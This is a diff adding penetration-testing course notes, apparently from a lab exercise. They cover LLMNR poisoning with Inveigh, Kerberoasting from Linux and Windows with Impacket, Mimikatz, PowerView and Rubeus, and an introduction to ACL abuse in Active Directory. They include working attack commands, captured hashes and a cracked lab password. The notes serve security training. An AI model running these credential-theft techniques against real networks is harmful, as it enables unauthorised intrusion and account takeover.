@@ -12,6 +12,92 @@ Typically we should start Responder and let it run for a while in a tmux window 
 
 We may at times obtain NTLMv1 hashes and other types of hashes and can consult the [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page to identify them and find the proper hash mode. If we ever obtain a strange or unknown hash, this site is a great reference to help identify it.
 
+# LLMNR/NBT-NS Poisoning (Windows)
+
+The tool [Inveigh](https://github.com/Kevin-Robertson/Inveigh) works similar to Responder, but is written in PowerShell and C#. Inveigh can listen to IPv4 and IPv6 and several other protocols, including `LLMNR`, DNS, `mDNS`, NBNS, `DHCPv6`, ICMPv6, `HTTP`, HTTPS, `SMB`, LDAP, `WebDAV`, and Proxy Auth.
+
+## Using Inveigh
+
+```powershell
+PS C:\htb> Import-Module .\Inveigh.ps1
+PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
+
+Key                     Value
+---                     -----
+ADIDNSHostsIgnore       System.Management.Automation.ParameterMetadata
+KerberosHostHeader      System.Management.Automation.ParameterMetadata
+ProxyIgnore             System.Management.Automation.ParameterMetadata
+PcapTCP                 System.Management.Automation.ParameterMetadata
+PcapUDP                 System.Management.Automation.ParameterMetadata
+SpooferHostsReply       System.Management.Automation.ParameterMetadata
+SpooferHostsIgnore      System.Management.Automation.ParameterMetadata
+SpooferIPsReply         System.Management.Automation.ParameterMetadata
+SpooferIPsIgnore        System.Management.Automation.ParameterMetadata
+WPADDirectHosts         System.Management.Automation.ParameterMetadata
+WPADAuthIgnore          System.Management.Automation.ParameterMetadata
+ConsoleQueueLimit       System.Management.Automation.ParameterMetadata
+ConsoleStatus           System.Management.Automation.ParameterMetadata
+ADIDNSThreshold         System.Management.Automation.ParameterMetadata
+ADIDNSTTL               System.Management.Automation.ParameterMetadata
+DNSTTL                  System.Management.Automation.ParameterMetadata
+HTTPPort                System.Management.Automation.ParameterMetadata
+HTTPSPort               System.Management.Automation.ParameterMetadata
+KerberosCount           System.Management.Automation.ParameterMetadata
+LLMNRTTL                System.Management.Automation.ParameterMetadata
+
+<SNIP>
+```
+
+```powershell
+PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+
+[*] Inveigh 1.506 started at 2022-02-28T19:26:30
+[+] Elevated Privilege Mode = Enabled
+[+] Primary IP Address = 172.16.5.25
+[+] Spoofer IP Address = 172.16.5.25
+[+] ADIDNS Spoofer = Disabled
+[+] DNS Spoofer = Enabled
+[+] DNS TTL = 30 Seconds
+
+<SNIP>
+```
+
+## C# Inveigh (InveighZero)
+
+The PowerShell version of Inveigh is the original version and is no longer updated. The tool author maintains the C# version, which combines the original PoC C# code and a C# port of most of the code from the PowerShell version.
+
+```powershell
+PS C:\htb> .\Inveigh.exe
+
+[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]
+[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
+[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
+[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
+[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
+[ ] DHCPv6
+[+] DNS Packet Sniffer [Type A]
+[ ] ICMPv6
+[+] LLMNR Packet Sniffer [Type A]
+[ ] MDNS
+
+<SNIP>
+```
+
+We can also see the message `Press ESC to enter/exit interactive console`, which is very useful while running the tool.
+
+We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`.
+
+```powershell
+================================================= Unique NTLMv2 Hashes =================================================
+
+Hashes
+========================================================================================================================
+backupagent::INLANEFREIGHT:B5013246091943D7:16A41B703C8D4F8F6AF75C47C3B50CB5:01010000000000001DBF1816222DD801DF80FE7D54E898EF0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008001DBF1816222DD8010600040002000000080030003000000000000000000000000030000004A1520CE1551E8776ADA0B3AC0176A96E0E200F3E0D608F0103EC5C3D5F22E80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
+forend::INLANEFREIGHT:32FD89BD78804B04:DFEB0C724F3ECE90E42BAF061B78BFE2:010100000000000016010623222DD801B9083B0DCEE1D9520000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080016010623222DD8010600040002000000080030003000000000000000000000000030000004A1520CE1551E8776ADA0B3AC0176A96E0E200F3E0D608F0103EC5C3D5F22E80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
+
+<SNIP>
+```
+
 # Enumerate Password Policies
 
 ## crackmapexec (nxc)
@@ -1168,4 +1254,576 @@ PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAc
   CN=LOGISTICS$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                               2080
   CN=FREIGHTLOGISTIC$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                         2080
 ```
+
+```powershell
+dsquery * -filter "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1)(description=*))" -limit 5 -attr SAMAccountName description
+```
+
+
+# Kerberoasting (Linux)
+
+Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) accounts.
+
+Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. 
+
+All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.
+
+## Performing the Attack
+
+A prerequisite to performing Kerberoasting attacks is either `domain user credentials` (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a `Domain Controller` so we can query it.
+
+## Listing SPN Accounts with GetUserSPNs.py
+
+```bash
+$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+
+Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
+
+Password:
+ServicePrincipalName                           <snipped>
+---------------------------------------------  <snipped>
+backupjob/veam001.inlanefreight.local          <snipped>
+sts/inlanefreight.local                        <snipped>
+MSSQLSvc/SPSJDB.inlanefreight.local:1433       <snipped>
+MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  <snipped>
+MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  <snipped>
+adfsconnect/azure01.inlanefreight.local        <snipped>
+```
+
+We can now pull all TGS tickets for offline processing using the `-request` flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John the Ripper for offline password cracking attempts.
+
+## Requesting all TGS Tickets
+
+```bash
+$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
+
+Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
+```
+
+## Requesting a Single TGS ticket
+
+```bash
+$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
+```
+
+With this ticket in hand, we could attempt to crack the user's password offline using Hashcat. If we are successful, we may end up with Domain Admin rights.
+
+## Saving the TGS Ticket to an Output File
+
+To facilitate offline cracking, it is always good to use the `-outputfile` flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.
+
+```bash
+$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
+
+Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
+```
+
+```bash
+$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
+
+hashcat (v6.1.1) starting...
+```
+
+## Testing Authentication against a Domain Controller
+
+```bash
+$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
+
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!)
+```
+
+# Kerberoasting (Windows)
+
+## Semi Manual Method
+
+Let's begin with the built-in [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241\(v=ws.11\)) binary to enumerate SPNs in the domain.
+
+```powershell
+C:\htb> setspn.exe -Q */*
+
+Checking domain DC=INLANEFREIGHT,DC=LOCAL
+CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
+        exchangeAB/ACADEMY-EA-DC01
+        exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+        TERMSRV/ACADEMY-EA-DC01
+        TERMSRV/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
+        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL
+
+<SNIP>
+
+CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        backupjob/veam001.inlanefreight.local
+CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        sts/inlanefreight.local
+
+<SNIP>
+
+CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        MSSQLSvc/SPSJDB.inlanefreight.local:1433
+CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        MSSQLSvc/SQL-CL01-01inlanefreight.local:49351
+CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
+CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        adfsconnect/azure01.inlanefreight.local
+
+Existing SPN found!
+```
+
+We will focus on `user accounts` and ignore the computer accounts returned by the tool. Next, using PowerShell, we can request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using `Mimikatz`.
+
+## Targeting Single User
+
+```powershell
+PS C:\htb> Add-Type -AssemblyName System.IdentityModel
+PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+
+Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
+SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+ValidFrom            : 2/24/2022 11:36:22 PM
+ValidTo              : 2/25/2022 8:55:25 AM
+ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
+SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+```
+
+We can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.
+
+## Retrieving All Tickets Using setspn.exe
+
+```powershell
+PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+
+Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-3
+SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+ValidFrom            : 2/24/2022 11:56:18 PM
+ValidTo              : 2/25/2022 8:55:25 AM
+ServicePrincipalName : exchangeAB/ACADEMY-EA-DC01
+SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+
+Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-4
+SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+ValidFrom            : 2/24/2022 11:56:18 PM
+ValidTo              : 2/24/2022 11:58:18 PM
+ServicePrincipalName : kadmin/changepw
+SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+
+Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-5
+SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+ValidFrom            : 2/24/2022 11:56:18 PM
+ValidTo              : 2/25/2022 8:55:25 AM
+ServicePrincipalName : WSMAN/ACADEMY-EA-MS01
+SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+
+<SNIP>
+```
+
+## Extracting Tickets from Memory with Mimikatz
+
+```powershell
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # base64 /out:true
+isBase64InterceptInput  is false
+isBase64InterceptOutput is true
+
+mimikatz # kerberos::list /export  
+
+<SNIP>
+
+[00000002] - 0x00000017 - rc4_hmac_nt      
+   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM
+   Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
+   Client Name       : htb-student @ INLANEFREIGHT.LOCAL
+   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
+====================
+Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
+====================
+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
+ZWZyZWlnaHQubG9jYWw6MTQzMw==
+====================
+
+   * Saved to file     : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
+
+<SNIP>
+```
+
+If we do not specify the `base64 /out:true` command, Mimikatz will extract the tickets and write them to `.kirbi` files.
+
+```bash
+echo "<base64 blob>" |  tr -d \\n 
+```
+
+We can place the above single line of output into a file and convert it back to a `.kirbi` file using the `base64` utility.
+
+## Placing the Output into a File as .kirbi
+
+```bash
+$ cat encoded_file | base64 -d > sqldev.kirbi
+```
+
+## Extracting the Kerberos Ticket using kirbi2john.py
+
+```bash
+$git clone https://github.com/nidem/kerberoast
+$cd kerberoast
+```
+
+```bash
+$ python kirbi2john.py sqldev.kirbi > crack_file
+```
+
+This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.
+
+```shell
+$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
+```
+
+## Cracking the Hash with Hashcat
+
+```shell
+$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
+```
+
+## Automated / Tool Based Route
+
+Next, we'll cover two much quicker ways to perform Kerberoasting from a Windows host.
+
+## Enumerate SPN Accounts (PowerView)
+
+```powershell
+PS C:\htb> Import-Module .\PowerView.ps1
+PS C:\htb> Get-DomainUser * -spn | select samaccountname
+
+samaccountname
+--------------
+adfs
+backupagent
+krbtgt
+sqldev
+sqlprod
+sqlqa
+solarwindsmonitor
+```
+
+## Target Specific User (PowerView)
+
+```powershell
+PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+
+SamAccountName       : sqldev
+DistinguishedName    : CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
+TicketByteHexStream  :
+Hash                 : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433*$BF9729001 <SNIOP>
+```
+
+## Exporting All Tickets to a CSV File
+
+```powershell
+PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+```
+
+## Rubeus /stats Flag
+
+We can also use [Rubeus](https://github.com/GhostPack/Rubeus) from GhostPack to perform Kerberoasting even faster and easier. Rubeus provides us with a variety of options for performing Kerberoasting.
+
+```powershell
+PS C:\htb> .\Rubeus.exe kerberoast /stats
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+
+[*] Action: Kerberoasting
+
+[*] Listing statistics about target users, no ticket requests being performed.
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 9
+
+
+ ------------------------------------------------------------
+ | Supported Encryption Type                        | Count |
+ ------------------------------------------------------------
+ | RC4_HMAC_DEFAULT                                 | 7     |
+ | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | 2     |
+ ------------------------------------------------------------
+
+ ----------------------------------
+ | Password Last Set Year | Count |
+ ----------------------------------
+ | 2022                   | 9     |
+ ----------------------------------
+```
+
+## Rubeus /nowrap Flag
+
+```powershell
+PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))(admincount=1))'
+
+[*] Total kerberoastable users : 3
+
+
+[*] SamAccountName         : backupagent
+[*] DistinguishedName      : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+[*] ServicePrincipalName   : backupjob/veam001.inlanefreight.local
+[*] PwdLastSet             : 2/15/2022 2:15:40 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*backupagent$INLANEFREIGHT.LOCAL$backupjob/veam001.inlanefreight.local@INLANEFREIGHT.LOCAL*$750F377DEFA85A67EA0FE51B0B28F83D$049EE7BF77ABC968169E1DD9E31B8249F509080C1AE6C8575B7E5A71995F345CB583FECC68050445FDBB9BAAA83AC7D553EECC57286F1B1E86CD16CB3266827E2BE2A151EC5845DCC59DA1A39C1BA3784BA8502A4340A90AB1F8D4869318FB0B2BEC2C8B6C688BD78BBF6D58B1E0A0B980826842165B0D88EAB7009353ACC9AD4FE32811101020456356360408BAD166B86DBE6AEB3909DEAE597F8C41A9E4148BD80CFF65A4C04666A977720B954610952AC19EDF32D73B760315FA64ED301947142438B8BCD4D457976987C3809C3320725A708D83151BA0BFF651DFD7168001F0B095B953CBC5FC3563656DF68B61199D04E8DC5AB34249F4583C25AC48FF182AB97D0BF1DE0ED02C286B42C8DF29DA23995DEF13398ACBE821221E8B914F66399CB8A525078110B38D9CC466EE9C7F52B1E54E1E23B48875E4E4F1D35AEA9FBB1ABF1CF1998304A8D90909173C25AE4C466C43886A650A460CE58205FE3572C2BF3C8E39E965D6FD98BF1B8B5D09339CBD49211375AE612978325C7A793EC8ECE71AA34FFEE9BF9BBB2B432ACBDA6777279C3B93D22E83C7D7DCA6ABB46E8CDE1B8E12FE8DECCD48EC5AEA0219DE26C222C808D5ACD2B6BAA35CBFFCD260AE05EFD347EC48213F7BC7BA567FD229A121C4309941AE5A04A183FA1B0914ED532E24344B1F4435EA46C3C72C68274944C4C6D4411E184DF3FE25D49FB5B85F5653AD00D46E291325C5835003C79656B2D85D092DFD83EED3ABA15CE3FD3B0FB2CF7F7DFF265C66004B634B3C5ABFB55421F563FFFC1ADA35DD3CB22063C9DDC163FD101BA03350F3110DD5CAFD6038585B45AC1D482559C7A9E3E690F23DDE5C343C3217707E4E184886D59C677252C04AB3A3FB0D3DD3C3767BE3AE9038D1C48773F986BFEBFA8F38D97B2950F915F536E16E65E2BF67AF6F4402A4A862ED09630A8B9BA4F5B2ACCE568514FDDF90E155E07A5813948ED00676817FC9971759A30654460C5DF4605EE5A92D9DDD3769F83D766898AC5FC7885B6685F36D3E2C07C6B9B2414C11900FAA3344E4F7F7CA4BF7C76A34F01E508BC2C1E6FF0D63AACD869BFAB712E1E654C4823445C6BA447463D48C573F50C542701C68D7DBEEE60C1CFD437EE87CE86149CDC44872589E45B7F9EB68D8E02070E06D8CB8270699D9F6EEDDF45F522E9DBED6D459915420BBCF4EA15FE81EEC162311DB8F581C3C2005600A3C0BC3E16A5BEF00EEA13B97DF8CFD7DF57E43B019AF341E54159123FCEDA80774D9C091F22F95310EA60165C805FED3601B33DA2AFC048DEF4CCCD234CFD418437601FA5049F669FEFD07087606BAE01D88137C994E228796A55675520AB252E900C4269B0CCA3ACE8790407980723D8570F244FE01885B471BF5AC3E3626A357D9FF252FF2635567B49E838D34E0169BDD4D3565534197C40072074ACA51DB81B71E31192DB29A710412B859FA55C0F41928529F27A6E67E19BE8A6864F4BC456D3856327A269EF0D1E9B79457E63D0CCFB5862B23037C74B021A0CDCA80B43024A4C89C8B1C622A626DE5FB1F99C9B41749DDAA0B6DF9917E8F7ABDA731044CF0E989A4A062319784D11E2B43554E329887BF7B3AD1F3A10158659BF48F9D364D55F2C8B19408C54737AB1A6DFE92C2BAEA9E
+```
+
+## Rubeus /tgtdeleg Flag
+
+We can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request.
+
+![](images/Pasted%20image%2020260107095510.png)
+
+
+# Access Control List (ACL) Abuse Primer
+
+In their simplest form, ACLs are lists that define a) who has access to which asset/resource and b) the level of access they are provisioned. The settings themselves in an ACL are called `Access Control Entries` (`ACEs`). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal.
+
+There are two types of ACLs:
+
+1. `Discretionary Access Control List` (`DACL`) - defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL for the level of access that is permitted. If a DACL does not exist for an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.
+	
+2. `System Access Control Lists` (`SACL`) - allow administrators to log access attempts made to secured objects.
+
+## Access Control Entries (ACEs)
+
+As stated previously, Access Control Lists (ACLs) contain ACE entries that name a user or group and the level of access they have over a given securable object. There are `three` main types of ACEs that can be applied to all securable objects in AD:
+
+| **ACE**              | **Description**                                                                                                                                                            |
+| -------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `Access denied ACE`  | Used within a DACL to show that a user or group is explicitly denied access to an object                                                                                   |
+| `Access allowed ACE` | Used within a DACL to show that a user or group is explicitly granted access to an object                                                                                  |
+| `System audit ACE`   | Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred |
+
+## Why are ACEs Important?
+
+Attackers utilize ACE entries to either further access or establish persistence. These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly.
+
+## ACL Attacks in the Wild
+
+We can use ACL attacks for:
+
+- Lateral movement
+- Privilege escalation
+- Persistence
+
+# ACL Enumeration
+
+## PowerView
+
+We can use PowerView to enumerate ACLs, but the task of digging through _all_ of the results will be extremely time-consuming and likely inaccurate. For example, if we run the function `Find-InterestingDomainAcl` we will receive a massive amount of information back that we would need to dig through to make any sense of it.
+
+```powershell
+PS C:\htb> Find-InterestingDomainAcl
+
+ObjectDN                : DC=INLANEFREIGHT,DC=LOCAL
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : ExtendedRight
+ObjectAceType           : ab721a53-1e2f-11d0-9819-00aa0040529b
+AceFlags                : ContainerInherit
+AceType                 : AccessAllowedObject
+InheritanceFlags        : ContainerInherit
+SecurityIdentifier      : S-1-5-21-3842939050-3880317879-2865463114-5189
+IdentityReferenceName   : Exchange Windows Permissions
+IdentityReferenceDomain : INLANEFREIGHT.LOCAL
